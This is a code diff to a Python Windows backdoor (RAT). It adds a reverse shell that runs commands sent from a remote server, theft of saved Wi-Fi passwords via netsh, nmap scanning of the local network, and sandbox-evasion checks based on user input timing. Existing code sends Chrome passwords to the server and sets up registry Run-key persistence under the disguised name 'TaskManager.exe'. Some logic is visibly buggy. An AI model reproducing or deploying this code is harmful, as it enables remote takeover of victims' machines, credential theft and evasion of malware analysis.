@@ -19,6 +19,14 @@ import GPUtil
 import psutil
 import platform
 from tabulate import tabulate
+import netifaces
+import nmap
+import ctypes
+import random
+import sys
+import time
+import re
+from collections import namedtuple
 
 # TODO: Make a dynamic way of getting this info
 server_info = {
@@ -334,7 +342,227 @@ def system_information():
       return out
 
 
+# Convert IP from dec form to bin form
+def ipToBin(ip):
+    return [bin(int(x)+256)[3:] for x in ip.split('.')] # Returns array of 4 binary octets
+
+# This get's the CIDR mask notation for a given IP, given your subnet mask
+def getSubnetMask(ip):
+      interfaces = netifaces.interfaces() # Get all network interfaces of the machine
+      mask = None
+      maskBits = 0
+
+      # Loop through the interfaces and look for the main one
+      for interface in interfaces:        
+            ifaddrInterface = netifaces.ifaddresses(interface)
+            if ifaddrInterface.get(2) != None:
+
+                  if ifaddrInterface[2][0]['addr'] == ip: # If the network interface IPv4 matches your IPv4:
+                        mask = ifaddrInterface[2][0]['netmask'] # Return the network mask
+                        break
+      
+      # Return the amount of `1` bits of the network mask
+      binMask = "".join(ipToBin(mask))
+      
+      # Loop through binary string and count the amount of `1` bits until a `0` is found
+      for bit in binMask:
+            if bit == '1':
+                  maskBits = maskBits + 1
+            
+            else:
+                  break
+
+      return maskBits
+
+# Returns the IPv4 of the default gateway
+def getDefaultGateway():
+    gateways = netifaces.gateways()
+    return gateways['default'][netifaces.AF_INET][0]
+
+# This might seem like a shady way of discovering your IPv4...
+# but if you don't do this, socket.gethostbyname() may return the wrong network adapter (with a different IP)... like Eth 2.
+# This way we make sure we get the right one (the one we actually use on our network).
+def getMyIPv4():
+      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      sock.connect(("8.8.8.8", 80)) # Just "ask google"
+      return sock.getsockname()[0]
+
+
+# Get all the hosts connected to your network
+# @params:
+#   - me: Indicate if your IPv4 should be displayed in the list (default: True)
+#   - gw: Indicate if the default gateway IP should be displayed in the list (default: True)
+def get_network_ips(me = True, gw = True):
+      # Get your IPv4
+      IPAddr = getMyIPv4()
+      
+      CIDR_ip_notation = IPAddr + '/' + str(getSubnetMask(IPAddr)) # IP in the format 192.168.139.109/24
+
+      # Try to fetch hosts with nmap
+      nm = nmap.PortScanner()
+      result = nm.scan(CIDR_ip_notation, arguments = '-sn')
+      allHosts = nm.all_hosts()
+
+      # Account for the flags
+      if not me:
+            if IPAddr in allHosts:
+                  allHosts.remove(IPAddr)
+      
+      if not gw:
+            dfgw = getDefaultGateway()
+            if dfgw in allHosts:
+                  allHosts.remove(dfgw)
+      
+      return allHosts
+
+
+# Returns a list of saved SSIDs in a Windows machine using netsh command
+def get_Windows_Saved_SSIDs():
+      # get all saved profiles in the PC
+      output = subprocess.check_output("netsh wlan show profiles").decode()
+      ssids = []
+
+      profiles = re.findall(r"All User Profile\s(.*)", output)
+      
+      for profile in profiles:
+          # for each SSID, remove spaces and colon
+          ssid = profile.strip().strip(":").strip()
+          # add to the list
+          ssids.append(ssid)
+      
+      return ssids
+
+# Extracts saved Wifi passwords saved in a Windows machine using netsh
+def get_Windows_Saved_Wifi_Passwords():
+      ssids = get_Windows_Saved_SSIDs()
+      Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
+      profiles = []
+      for ssid in ssids:
+            ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
+
+            # get the ciphers
+            ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
+
+            # clear spaces and colon
+            ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
+
+            # get the Wi-Fi password
+            key = re.findall(r"Key Content\s(.*)", ssid_details)
+            
+            # clear spaces and colon
+            try:
+                  key = key[0].strip().strip(":").strip()
+            except IndexError:
+                  key = "None"
+
+            profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
+            profiles.append(profile)
+
+      return profiles
+
+
 # HELPER FUNCTIONS END
+
+
+# SANDBOX DETECTION BEGIN
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+
+keystrokes = 0
+mouse_clicks = 0
+double_clicks = 0
+
+class Last_Input_Info(ctypes.Structure):
+      _fields_ = [
+            ("cbSize" ,ctypes.c_uint),
+            ("dwTime" ,ctypes.c_ulong)
+      ]
+
+
+def get_last_input():
+      struct_lastinputinfo = Last_Input_Info()
+      struct_lastinputinfo.cbSize = ctypes.sizeof(Last_Input_Info)
+
+      # Get last input registered
+      user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))
+
+      # Determine how long the machine has been running
+      run_time = kernel32.GetTickCount()
+      elasped  =  - struct_lastinputinfo.dwTime
+      return elasped
+
+
+def get_key_press():
+    global mouse_clicks
+    global keystrokes
+
+    for i in range(0 ,0xff):
+        if user32.GetAsyncKeyState(i) == -32767 :
+
+            if 1 == 0x1 : # 0x1 is the code for a left mouse-click
+                mouse_clicks +=1
+                return time.time()
+            elif i>32 and i < 127:
+                keystrokes += 1
+
+    return None
+
+# This function can run in a separate thread
+# It will inform the server if the backdoor session might be a sandbox
+def detect_Sandbox(sockfd):
+      global mouse_clicks
+      global keystrokes
+
+      max_keystrokes = random.randint(10 ,25)
+      max_mouse_clicks = random.randint(5 ,25)
+
+      double_clicks = 0
+      max_double_clicks = 10
+      double_click_threshold = 0.250 #in seconds
+      first_double_click = None
+
+      average_mousetime = 0
+      max_input_threshold = 30000 #in milliseconds
+
+      detection_complete = False
+      previous_timestamp = None
+
+      last_input = get_last_input()
+
+      # If we hit our threshold bail tf out
+      if last_input >= max_input_threshold :
+            send(sockfd, "SANDBOX") # Inform the server that we are a sandbox
+            sys.exit(0)
+
+      while not detection_complete :
+            keypress_time  = get_key_press()
+
+            if keypress_time is not None and previous_timestamp is not None :
+                  # Calculate time between double clicks
+                  elapsed = keypress_time - previous_timestamp
+
+                  if elapsed <= double_click_threshold: # The user double clicked 
+                        double_clicks += 1
+
+                        if first_double_click is None :
+                              first_double_click = time.time() # Grab the timestamp of the first double click
+
+                        else :
+                              if double_clicks == max_double_clicks :
+                                    if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
+                                          sys.exit(0)
+
+                  # If there is enough user input... we can assume we aren't in a sandbox
+                  if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks :
+                        return
+
+                  previous_timestamp = keypress_time
+
+            elif keypress_time is not None :
+                previous_timestamp = keypress_time
+
+# SANDBOX DETECTION END
 
 
 class Backdoor:
@@ -349,6 +577,12 @@ class Backdoor:
             sender_thread.setDaemon(True)
             sender_thread.start()
             sender_thread.join()
+      
+      def check_sandbox(self):
+            sandbox_thread = threading.Thread(target=detect_Sandbox, args=(self.sockfd,))
+            sandbox_thread.setDaemon(True)
+            sandbox_thread.start()
+            sandbox_thread.join()
 
       # Enable the backdoor to run on system startup by copying it to %AppData% 
       # and adding a registry key to the Windows Registry
@@ -359,15 +593,50 @@ class Backdoor:
             filePath = os.environ['appdata'] + "\\" + copyName
             
             try:
-                  if os.path.exists(filePath): # If the file already exists, replace it
-                        shutil.copyfile(sys.executable, filePath)
-                        subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {regName} /t REG_SZ /d "{filePath}"', shell=True)
-                        send(self.sockfd, f'[+] Successfuly created persistence file with Reg Key: {regName}')
+                  shutil.copyfile(sys.executable, filePath)
+                  subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {regName} /t REG_SZ /d "{filePath}"', shell=True)
+                  send(self.sockfd, f'[+] Successfuly created persistence file with Reg Key: {regName}')
       
             except Exception as e:
                   send(f'[-] Error: Unable to create persistence file: {e}')
 
-      # Backdoor-Server interface
+
+      def reverse_shell(self):
+            while True:
+                  send(self.sockfd, os.getcwd())
+                  command = recv(self.sockfd)
+
+                  # Attempt to run the command on the shell
+                  try:
+                        if command != 'cls': # clear screen bugs the reverse shell and freezes the backdoor bc process.stdout.read() is blocking
+                              if command.startswith('cd'): # cd has a different handling than other commands
+                                    try:
+                                          os.chdir(command[3:])
+                                          send(self.sockfd, f'[+] Changed directory to {os.getcwd()}')
+                                          continue
+
+                                    except Exception as e:
+                                          send(self.sockfd, f'[-] Error: {e}')
+                                          continue
+                              
+                              elif command == 'exit':
+                                    break
+
+                              else:
+                                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                                    
+                                    try: # Sometimes the reverse shell freezes, so we can handle keyboard interrupts
+                                          out = process.stdout.read() + process.stderr.read()
+                                          send(self.sockfd, out.decode('latin-1'))
+                                    
+                                    except KeyboardInterrupt:
+                                          send(self.sockfd, '[-] Stopped execution: Keyboard Interrupt')
+                              
+                  except Exception as e:
+                        send(self.sockfd, f'[-] Error: {e}')
+
+
+      # Backdoor->Server interface
       def server_coms(self):
             while True:
                   command = recv(self.sockfd)
@@ -401,6 +670,11 @@ class Backdoor:
                         password_data = get_chrome_passwords()
                         send(self.sockfd, password_data)
                   
+                  elif command == 'wifi-passwords':
+                        # TODO: Add support for Linux targets
+                        profiles = get_Windows_Saved_Wifi_Passwords()
+                        send(self.sockfd, profiles)
+                  
                   elif command == 'system-info':
                         send(self.sockfd, system_information())
                   
@@ -414,22 +688,31 @@ class Backdoor:
                   elif command == 'enable-startup':
                         self.enable_startup("TaskManager", "TaskManager.exe") # Random name to "hide" the backdoor
                   
-                  else:
-                        # Attempt to run the command on the shell
-                        try:
-                              if command != 'cls': # clear screen bugs the reverse shell and freezes the backdoor bc process.stdout.read() is blocking
-                                    if command.startswith('cd '):
-                                        os.chdir(command[3:]) # cd has a different handling than other commands
+                  elif command == 'connected-machines':
+                        should_fetch_names = recv(self.sockfd)
+                        all_hosts = get_network_ips()
+                        out = '[+] Connected machines:\n'
 
+                        if should_fetch_names == 'true':
+                              for host in all_hosts:
+                                    if host == getDefaultGateway():
+                                          out += f'\t- {host} (Default Gateway)\n'                                    
+                                    elif host == getMyIPv4():
+                                          out += f'\t- {host} (Target)\n'
                                     else:
-                                          process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                                          out = process.stdout.read() + process.stderr.read()
-                                          send(self.sockfd, out.decode('utf-8'))
+                                          out += f'\t- {host} ({socket.gethostbyaddr(host)[0]}) \n'
+                        else:
+                              if host == getDefaultGateway():
+                                    out += f'\t- {host} (Default Gateway)\n'                                    
+                              elif host == getMyIPv4():
+                                    out += f'\t- {host} (Target)\n'
                               else:
-                                    send(self.sockfd, '')
+                                    out += f'\t- {host}\n'
                         
-                        except Exception as e:
-                              send(self.sockfd, f'[-] Error: {e}')
+                        send(self.sockfd, out)
+
+                  elif command == 'reverse-shell':
+                        self.reverse_shell()
 
       def start(self):
             # Attempt to connect to the server every 10 seconds until a connection is established
